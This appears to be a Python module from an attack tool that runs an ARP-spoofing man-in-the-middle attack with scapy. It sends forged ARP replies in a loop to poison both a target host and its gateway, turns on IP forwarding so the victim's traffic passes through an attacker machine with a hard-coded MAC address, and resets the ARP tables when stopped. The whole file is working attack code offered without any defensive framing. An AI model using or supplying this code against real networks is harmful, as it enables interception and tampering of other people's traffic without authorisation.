import time
import scapy.all as scapy
from . import STATUS, STOP_EVENT
from .utils import log_msg, set_ip_forwarding, set_port_forwarding, get_mac

ATTACKER_MAC = "08:00:27:34:33:03"  # Ideally, fetch dynamically in run.py

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False, iface=STATUS["interface"])

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    if dest_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False, iface=STATUS["interface"])

def run_attack_loop(target_ip, gateway_ip):
    STATUS["state"] = "RUNNING"
    STATUS["packets"] = 0
    set_ip_forwarding(1)
    
    try:
        target_mac = get_mac(target_ip)
        if not target_mac:
            log_msg("[!] Warning: Could not resolve Target MAC.")
            target_mac = "ff:ff:ff:ff:ff:ff" # Fallback
        
        STATUS["target_mac"] = target_mac
        mitm_mac = get_mac(gateway_ip)
        
        while not STOP_EVENT.is_set():
            spoof(target_ip, gateway_ip, target_mac)
            if mitm_mac:
                spoof(gateway_ip, target_ip, mitm_mac)
            
            STATUS["packets"] += 1
            time.sleep(2)
            
    except Exception as e: log_msg(f"ARP ERROR: {e}")
    finally:
        log_msg("[-] Stopping ARP... Restoring network.")
        restore(target_ip, gateway_ip)
        set_ip_forwarding(0)
        set_port_forwarding(False)
        STATUS["state"] = "IDLE"
        STATUS["mode"] = "NONE"
        STOP_EVENT.clear()